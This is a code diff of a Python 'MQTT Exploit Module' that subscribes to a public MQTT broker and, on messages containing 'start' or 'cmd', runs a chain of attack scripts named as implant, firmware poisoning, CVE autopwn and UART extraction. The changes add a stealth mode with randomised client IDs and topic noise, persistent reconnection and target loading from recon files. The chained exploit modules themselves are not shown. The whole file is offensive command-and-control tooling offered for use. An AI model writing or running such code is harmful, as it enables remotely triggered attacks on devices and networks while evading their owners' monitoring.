@@ -1,15 +1,8 @@
 import paho.mqtt.client as mqtt
-import time
-import json
-import threading
-import socket
-import os
-import sys
+import time, json, threading, socket, os, sys, signal, argparse, random, string
 from pathlib import Path
 from datetime import datetime
 import websocket
-import signal
-import argparse
 
 # Constants
 DEFAULT_BROKER = "broker.hivemq.com"
@@ -26,24 +19,22 @@ CHAIN_SCRIPT_3 = "modules/firmware/cve_autopwn.py"
 CHAIN_SCRIPT_4 = "modules/hardware/uart_extractor.py"
 CHAIN_SCRIPT_5 = "modules/report_builder.py"
 WS_DASHBOARD_URI = "ws://localhost:8765"
-
 AGENT_ID = "mqtt_agent"
+
 os.makedirs("reports", exist_ok=True)
 os.makedirs("webgui", exist_ok=True)
 
-# Globals
 payload_export = []
-client = None
 
 def log(msg):
     timestamp = datetime.utcnow().isoformat()
-    full_msg = f"[{timestamp}] [MQTTX] {msg}"
-    print(full_msg)
+    entry = f"[{timestamp}] [MQTTX] {msg}"
+    print(entry)
     with open("reports/mqttex_hijack.log", "a") as f:
-        f.write(full_msg + "\n")
+        f.write(entry + "\n")
 
 def graceful_shutdown(sig, frame):
-    log("Interrupt received. Shutting down MQTT client.")
+    log("Interrupt received. Shutting down.")
     sys.exit(0)
 
 signal.signal(signal.SIGINT, graceful_shutdown)
@@ -95,7 +86,7 @@ def export_payload(topic, payload):
         json.dump(payload_export, f, indent=2)
 
 def auto_chain_attacks():
-    log("Triggering: implant â firmware poison â CVE autopwn â UART flash â report")
+    log("Triggering: implant → firmware poison → CVE autopwn → UART flash → report")
     os.system(f"python3 {CHAIN_SCRIPT_1}")
     time.sleep(2)
     os.system(f"python3 {CHAIN_SCRIPT_2}")
@@ -106,63 +97,74 @@ def auto_chain_attacks():
     time.sleep(2)
     os.system(f"python3 {CHAIN_SCRIPT_5}")
 
-def on_connect(client, userdata, flags, rc):
-    log(f"Connected with result code {rc}")
-    client.subscribe(userdata['topic'])
-
-def on_message(client, userdata, msg):
-    payload = msg.payload.decode(errors='ignore')
-    log(f"Message on {msg.topic}: {payload}")
-    export_payload(msg.topic, payload)
-    update_killchain(f"MQTT payload received: {msg.topic}")
-
-    if "start" in payload or "cmd" in payload:
-        log("Trigger condition met. Executing chained attacks.")
-        push_alert_file()
-        push_alert_websocket("Trigger detected on MQTT channel")
-        auto_chain_attacks()
-
 def get_targets_from_recon():
     targets = []
-    for file_path in [RECON_WIFI_FILE, RECON_MODBUS_FILE]:
-        if Path(file_path).exists():
+    for path in [RECON_WIFI_FILE, RECON_MODBUS_FILE]:
+        if Path(path).exists():
             try:
-                with open(file_path) as f:
+                with open(path) as f:
                     data = json.load(f)
                     for item in data if isinstance(data, list) else data.values():
                         ip = item.get("ip") or item.get("host") or item.get("target")
-                        if ip:
-                            targets.append(ip)
+                        if ip: targets.append(ip)
             except Exception as e:
-                log(f"Failed to load recon targets: {e}")
+                log(f"Recon load failed: {e}")
     return targets
 
 def publish_command(broker, topic, command):
     mqttc = mqtt.Client()
     mqttc.connect(broker, DEFAULT_PORT)
     mqttc.publish(topic, command)
-    log(f"[â] Published '{command}' to topic '{topic}'")
+    log(f"[→] Published '{command}' to topic '{topic}'")
     mqttc.disconnect()
 
-def start_client(broker, topic):
-    userdata = {'topic': topic}
-    mqtt_client = mqtt.Client(userdata=userdata)
+def random_string(length=6):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def start_client(broker, topic, stealth=False):
+    topic_to_subscribe = topic
+    client_id = f"redot_client_{random_string()}" if stealth else ""
+
+    if stealth:
+        topic_to_subscribe += "/" + random_string(4)
+
+    userdata = {'topic': topic_to_subscribe}
+    mqtt_client = mqtt.Client(client_id=client_id, userdata=userdata)
     mqtt_client.on_connect = on_connect
     mqtt_client.on_message = on_message
+
+    log(f"Connecting with{' stealth' if stealth else ''} client_id: {client_id or '[default]'}")
     try:
         mqtt_client.connect(broker, DEFAULT_PORT, 60)
-        mqtt_client.loop_forever()
+        mqtt_client.loop_forever(retry_first_connection=True)
     except socket.error as e:
         log(f"Socket error: {e}")
-        return
+
+def on_connect(client, userdata, flags, rc):
+    log(f"Connected to broker with result code {rc}")
+    client.subscribe(userdata['topic'])
+    log(f"Subscribed to topic: {userdata['topic']}")
+
+def on_message(client, userdata, msg):
+    payload = msg.payload.decode(errors='ignore')
+    log(f"[←] Topic: {msg.topic} | Payload: {payload}")
+    export_payload(msg.topic, payload)
+    update_killchain(f"MQTT payload received: {msg.topic}")
+
+    if "start" in payload or "cmd" in payload:
+        log("Trigger condition met. Launching chained payloads.")
+        push_alert_file()
+        push_alert_websocket("Trigger detected on MQTT channel")
+        auto_chain_attacks()
 
 def main():
-    parser = argparse.ArgumentParser(description="MQTT Exploit Module")
+    parser = argparse.ArgumentParser(description="MQTT Exploit Module with Stealth + Persistence")
     parser.add_argument("--broker", help="MQTT broker address")
     parser.add_argument("--topic", help="MQTT topic to subscribe")
-    parser.add_argument("--publish", help="Publish a command (one-shot) and exit")
-    args = parser.parse_args()
+    parser.add_argument("--publish", help="Publish a command and exit")
+    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (random ID + topic noise)")
 
+    args = parser.parse_args()
     broker = args.broker or input(f"MQTT Broker [{DEFAULT_BROKER}]: ") or DEFAULT_BROKER
     topic = args.topic or input(f"Topic to subscribe [{DEFAULT_TOPIC}]: ") or DEFAULT_TOPIC
 
@@ -177,9 +179,9 @@ def main():
 
     targets = get_targets_from_recon()
     if targets:
-        log(f"Discovered targets: {targets}")
+        log(f"Discovered potential MQTT-reachable targets: {targets}")
 
-    start_client(broker, topic)
+    start_client(broker, topic, stealth=args.stealth)
 
 if __name__ == "__main__":
     main()
